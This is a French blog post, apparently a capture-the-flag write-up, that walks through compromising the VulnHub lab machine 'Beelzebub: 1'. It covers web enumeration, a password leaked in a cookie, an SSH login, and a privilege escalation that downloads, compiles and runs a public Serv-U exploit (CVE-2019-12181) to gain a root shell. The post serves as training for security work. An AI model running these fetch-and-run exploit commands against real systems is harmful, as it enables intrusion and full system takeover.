<!DOCTYPE html>
<html data-html-server-rendered="true" lang="fr" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22fr%22%7D%7D">
  <head>
    <title>CTF Beelzebub: 1 - https://etienner.github.io</title><meta name="gridsome:hash" content="e9e710b63b02d049a9f8a5359c5c22618737fe2f"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.14"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:type" content="article"><meta data-vue-tag="ssr" property="og:title" content="CTF Beelzebub: 1"><meta data-vue-tag="ssr" property="og:description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:url" content="https://etienner.github.io/ctf-beelzebub-1/"><meta data-vue-tag="ssr" name="twitter:domain" content="https://etienner.github.io"><meta data-vue-tag="ssr" name="twitter:card" content="summary_large_image"><meta data-vue-tag="ssr" name="twitter:title" content="CTF Beelzebub: 1"><meta data-vue-tag="ssr" name="twitter:description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" name="twitter:site" content="@etiennerouzeaud"><meta data-vue-tag="ssr" name="twitter:creator" content="@etiennerouzeaud"><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.9bb7ffafafc09ac851d81afb65b8ef59.png"><link rel="preload" href="/assets/css/0.styles.a80f6262.css" as="style"><link rel="preload" href="/assets/js/app.8917d561.js" as="script"><link rel="preload" href="/assets/js/page--src-templates-post-vue.93f54eeb.js" as="script"><link rel="prefetch" href="/assets/js/page--node-modules-gridsome-app-pages-404-vue.5bf39404.js"><link rel="prefetch" href="/assets/js/page--src-pages-index-vue.1fdd30a3.js"><link rel="prefetch" href="/assets/js/page--src-templates-tag-vue.8311241e.js"><link rel="stylesheet" href="/assets/css/0.styles.a80f6262.css"><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
  </head>
  <body >
    <div data-server-rendered="true" id="app"><header class="py-2 text-center"><strong><a href="/" title="Accueil" class="active">Etienne ROUZEAUD - D√©veloppeur Web</a></strong></header><main><div class="title py-2 text-center" data-v-4b217994><h1 class="display-5 pt-2" data-v-4b217994>CTF Beelzebub: 1</h1><!----></div><div class="container"><div class="row sidebar"><div class="mt-4 col-lg-2"><p><em><span>09 novembre 2021</span></em></p><ul class="list-unstyled"><li>
            üè∑Ô∏è <a href="/tag/Pentest/">Pentest</a></li><li>
            üè∑Ô∏è <a href="/tag/CTF/">CTF</a></li></ul><p>‚åö 4 mins de lecture</p><p><a href="https://www.vulnhub.com/entry/beelzebub-1,742" target="_blank" rel="noopener">
            üíæ T√©l√©chargement
          </a></p></div><div class="col-lg-10 mt-4"><!----><article><h2>Avant propos</h2>
<p>Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propri√©taire.<br>
Ce CTF a √©t√© r√©alis√© avec une machine attaquante <strong>Kali 2021.3</strong> (<code class="language-text">lsb_release -r</code>).</p>
<h2>Enum√©ration</h2>
<p>On r√©cup√®re l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class="language-text">sudo netdiscover</code>.<br>
Avant de poursuivre, on exporte cette adresse dans une variable pour √™tre tranquille par la suite <code class="language-text">export IP=192.168.1.31</code>.<br>
Puis on cr√©√© un dossier d√©di√© √† ce CTF <code class="language-text">cd Documents/ctf &amp;&amp; mkdir beelzebub1 &amp;&amp; cd beelzebub1</code>.<br>
On lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ nmap -sV -sT -p- <span class="token variable">$IP</span> -oN nmap.txt
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.6p1 Ubuntu 4ubuntu0.3 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.29 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>On a un serveur <strong>SSH</strong> sur le port <strong>22</strong> et un serveur <strong>Apache</strong> 2.4.29 sur le port <strong>80</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ gobuster <span class="token function">dir</span> -u http://<span class="token variable">$IP</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,css,js,txt,php,xml,zip -o gobuster.txt
/index.php            <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">271</span><span class="token punctuation">]</span>
/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">10918</span><span class="token punctuation">]</span>
/javascript           <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">317</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.31/javascript/<span class="token punctuation">]</span>
/phpmyadmin           <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">317</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.31/phpmyadmin/<span class="token punctuation">]</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Sur le fichier "index.php", on a le message "Not Found" alors que si on regarde dans le code source, on a un indice.</p>
<div class="gridsome-highlight" data-language="back"><pre style="counter-reset: linenumber NaN" class="language-back line-numbers"><code class="language-back">$ curl -i http://$IP/index.php 
HTTP/1.1 200 OK
[...]
&lt;!--My heart was encrypted, &quot;beelzebub&quot; somehow hacked and decoded it.-md5--&gt;</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>On d√©code la chaine de caract√®re "beelzebub" en md5.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token builtin class-name">echo</span> -n beelzebub <span class="token operator">|</span> md5sum
d18e1e22becbd915b45e0e655429d487</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Si on tente d'acc√©der au serveur avec cette chaine de caract√®res, on a une erreur de redirection 301.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">curl</span> -i http://<span class="token variable">$IP</span>/d18e1e22becbd915b45e0e655429d487
HTTP/1.1 <span class="token number">301</span> Moved Permanently
<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>Int√©ressant, poursuivons avec un <strong>Gobuster</strong> sur cette URL.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ gobuster <span class="token function">dir</span> -u http://<span class="token variable">$IP</span>/d18e1e22becbd915b45e0e655429d487 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,css,js,txt,php,xml,zip -o gobuster2.txt
/index.php            <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">57718</span><span class="token punctuation">]</span>
/wp-content           <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">350</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.31/d18e1e22becbd915b45e0e655429d487/wp-content/<span class="token punctuation">]</span>
/wp-login.php         <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">5694</span><span class="token punctuation">]</span>                                                                      
/license.txt          <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">19935</span><span class="token punctuation">]</span>                                                                     
/wp-includes          <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">351</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.31/d18e1e22becbd915b45e0e655429d487/wp-includes/<span class="token punctuation">]</span>
/readme.html          <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">7368</span><span class="token punctuation">]</span>                                                                       
/wp-admin             <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">348</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.31/d18e1e22becbd915b45e0e655429d487/wp-admin/<span class="token punctuation">]</span>   
/xmlrpc.php           <span class="token punctuation">(</span>Status: <span class="token number">405</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">42</span><span class="token punctuation">]</span> </code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Apparement, on est sur un r√©pertoire du CMS <strong>Wordpress</strong>.</p>
<p>Dans le r√©pertoire "/d18e1e22becbd915b45e0e655429d487/wp-content/uploads"/ il y a 2 dossiers, "2021" et "Talk To VALAK". Dans ce second dossier, on arrive une page Web qui nous demande de saisir un nom. En soumettant le formulaire (bouton "Say Hi to VALAK"), on trouve un √©ventuel mot de passe dans le cookie de la requ√™te POST.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash"><span class="token function">curl</span> -i -d <span class="token string">'name=john'</span> http://<span class="token variable">$IP</span>/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/Talk%20To%20VALAK/index.php
Set-Cookie: <span class="token assign-left variable">Password</span><span class="token operator">=</span>M4k3Ad3a1</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Il nous manque l'utilisateur de cet √©ventuel mot de passe.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">wpscan --url http://<span class="token variable">$IP</span>/d18e1e22becbd915b45e0e655429d487 -e u --ignore-main-redirect --force
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> valak
 <span class="token operator">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span> Confirmed By: Login Error Messages <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> krampus
 <span class="token operator">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span> Confirmed By: Login Error Messages <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>P√©n√©tration</h2>
<p>On arrive √† se connecter au serveur avec le second utilisateur.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">ssh</span> krampus@<span class="token variable">$IP</span>
password: M4k3Ad3a1</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<h2>Escalation</h2>
<p>Dans le r√©pertoire courant de l'utilisateur, on retrouve un historique des commandes int√©ressantes dont celle ci-dessous.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash"><span class="token function">cat</span> .bash_history
<span class="token function">wget</span> https://www.exploit-db.com/download/47009
<span class="token function">mv</span> <span class="token number">47009</span> ./exploit.c
gcc exploit.c -o exploit
./exploit</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Elle nous indique l'exploit √† utiliser, "CVE-2019-12181 : Serv-U FTP Server &#x3C; 15.1.7 - Local Privilege Escalation".</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token builtin class-name">cd</span> /tmp
$ <span class="token function">wget</span> https://www.exploit-db.com/download/47009 -O exploit.c
$ gcc exploit.c -o exploit
$ ./exploit

<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,4<span class="token punctuation">(</span>adm<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,33<span class="token punctuation">(</span>www-data<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,116<span class="token punctuation">(</span>lpadmin<span class="token punctuation">)</span>,126<span class="token punctuation">(</span>sambashare<span class="token punctuation">)</span>,1000<span class="token punctuation">(</span>krampus<span class="token punctuation">)</span>
opening root shell
<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,4<span class="token punctuation">(</span>adm<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,33<span class="token punctuation">(</span>www-data<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,116<span class="token punctuation">(</span>lpadmin<span class="token punctuation">)</span>,126<span class="token punctuation">(</span>sambashare<span class="token punctuation">)</span>,1000<span class="token punctuation">(</span>krampus<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Et on trouve facilement le flag root.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> /root/root.txt
8955qpasq8qq807879p75e1rr24cr1a5</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
</article></div></div></div></main><footer class="text-white mt-4"><ul class="nav nav-pills justify-content-center"><li><a href="https://github.com/etienner" target="_blank" rel="noopener" class="nav-link">Github</a></li><li><a href="https://medium.com/@etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Medium</a></li><li><a href="https://twitter.com/etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Twitter</a></li></ul></footer></div>
    <script>window.__INITIAL_STATE__={"data":{"post":{"title":"CTF Beelzebub: 1","date":"9 November 2021","content":"\u003Ch2\u003EAvant propos\u003C\u002Fh2\u003E\n\u003Cp\u003ELe d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propri√©taire.\u003Cbr\u003E\nCe CTF a √©t√© r√©alis√© avec une machine attaquante \u003Cstrong\u003EKali 2021.3\u003C\u002Fstrong\u003E (\u003Ccode class=\"language-text\"\u003Elsb_release -r\u003C\u002Fcode\u003E).\u003C\u002Fp\u003E\n\u003Ch2\u003EEnum√©ration\u003C\u002Fh2\u003E\n\u003Cp\u003EOn r√©cup√®re l'adresse IP de la machine distante avec \u003Cstrong\u003ENetdiscover\u003C\u002Fstrong\u003E \u003Ccode class=\"language-text\"\u003Esudo netdiscover\u003C\u002Fcode\u003E.\u003Cbr\u003E\nAvant de poursuivre, on exporte cette adresse dans une variable pour √™tre tranquille par la suite \u003Ccode class=\"language-text\"\u003Eexport IP=192.168.1.31\u003C\u002Fcode\u003E.\u003Cbr\u003E\nPuis on cr√©√© un dossier d√©di√© √† ce CTF \u003Ccode class=\"language-text\"\u003Ecd Documents\u002Fctf &amp;&amp; mkdir beelzebub1 &amp;&amp; cd beelzebub1\u003C\u002Fcode\u003E.\u003Cbr\u003E\nOn lance \u003Cstrong\u003ENmap\u003C\u002Fstrong\u003E pour scanner les ports de la machine distante.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ nmap -sV -sT -p- \u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E -oN nmap.txt\nPORT   STATE SERVICE VERSION\n\u003Cspan class=\"token number\"\u003E22\u003C\u002Fspan\u003E\u002Ftcp \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  \u003Cspan class=\"token function\"\u003Essh\u003C\u002Fspan\u003E     OpenSSH \u003Cspan class=\"token number\"\u003E7\u003C\u002Fspan\u003E.6p1 Ubuntu 4ubuntu0.3 \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EUbuntu Linux\u003Cspan class=\"token punctuation\"\u003E;\u003C\u002Fspan\u003E protocol \u003Cspan class=\"token number\"\u003E2.0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token number\"\u003E80\u003C\u002Fspan\u003E\u002Ftcp \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  http    Apache httpd \u003Cspan class=\"token number\"\u003E2.4\u003C\u002Fspan\u003E.29 \u003Cspan class=\"token variable\"\u003E\u003Cspan class=\"token punctuation\"\u003E((\u003C\u002Fspan\u003EUbuntu\u003Cspan class=\"token punctuation\"\u003E))\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn a un serveur \u003Cstrong\u003ESSH\u003C\u002Fstrong\u003E sur le port \u003Cstrong\u003E22\u003C\u002Fstrong\u003E et un serveur \u003Cstrong\u003EApache\u003C\u002Fstrong\u003E 2.4.29 sur le port \u003Cstrong\u003E80\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ gobuster \u003Cspan class=\"token function\"\u003Edir\u003C\u002Fspan\u003E -u http:\u002F\u002F\u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E -w \u002Fusr\u002Fshare\u002Fwordlists\u002Fdirbuster\u002Fdirectory-list-2.3-medium.txt -x html,css,js,txt,php,xml,zip -o gobuster.txt\n\u002Findex.php            \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EStatus: \u003Cspan class=\"token number\"\u003E200\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003ESize: \u003Cspan class=\"token number\"\u003E271\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E\n\u002Findex.html           \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EStatus: \u003Cspan class=\"token number\"\u003E200\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003ESize: \u003Cspan class=\"token number\"\u003E10918\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E\n\u002Fjavascript           \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EStatus: \u003Cspan class=\"token number\"\u003E301\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003ESize: \u003Cspan class=\"token number\"\u003E317\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E--\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E http:\u002F\u002F192.168.1.31\u002Fjavascript\u002F\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E\n\u002Fphpmyadmin           \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EStatus: \u003Cspan class=\"token number\"\u003E301\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003ESize: \u003Cspan class=\"token number\"\u003E317\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E--\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E http:\u002F\u002F192.168.1.31\u002Fphpmyadmin\u002F\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003ESur le fichier \"index.php\", on a le message \"Not Found\" alors que si on regarde dans le code source, on a un indice.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"back\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-back line-numbers\"\u003E\u003Ccode class=\"language-back\"\u003E$ curl -i http:\u002F\u002F$IP\u002Findex.php \nHTTP\u002F1.1 200 OK\n[...]\n&lt;!--My heart was encrypted, &quot;beelzebub&quot; somehow hacked and decoded it.-md5--&gt;\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn d√©code la chaine de caract√®re \"beelzebub\" en md5.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token builtin class-name\"\u003Eecho\u003C\u002Fspan\u003E -n beelzebub \u003Cspan class=\"token operator\"\u003E|\u003C\u002Fspan\u003E md5sum\nd18e1e22becbd915b45e0e655429d487\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003ESi on tente d'acc√©der au serveur avec cette chaine de caract√®res, on a une erreur de redirection 301.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Ecurl\u003C\u002Fspan\u003E -i http:\u002F\u002F\u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E\u002Fd18e1e22becbd915b45e0e655429d487\nHTTP\u002F1.1 \u003Cspan class=\"token number\"\u003E301\u003C\u002Fspan\u003E Moved Permanently\n\u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E..\u003C\u002Fspan\u003E.\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EInt√©ressant, poursuivons avec un \u003Cstrong\u003EGobuster\u003C\u002Fstrong\u003E sur cette URL.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ gobuster \u003Cspan class=\"token function\"\u003Edir\u003C\u002Fspan\u003E -u http:\u002F\u002F\u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E\u002Fd18e1e22becbd915b45e0e655429d487 -w \u002Fusr\u002Fshare\u002Fwordlists\u002Fdirbuster\u002Fdirectory-list-2.3-medium.txt -x html,css,js,txt,php,xml,zip -o gobuster2.txt\n\u002Findex.php            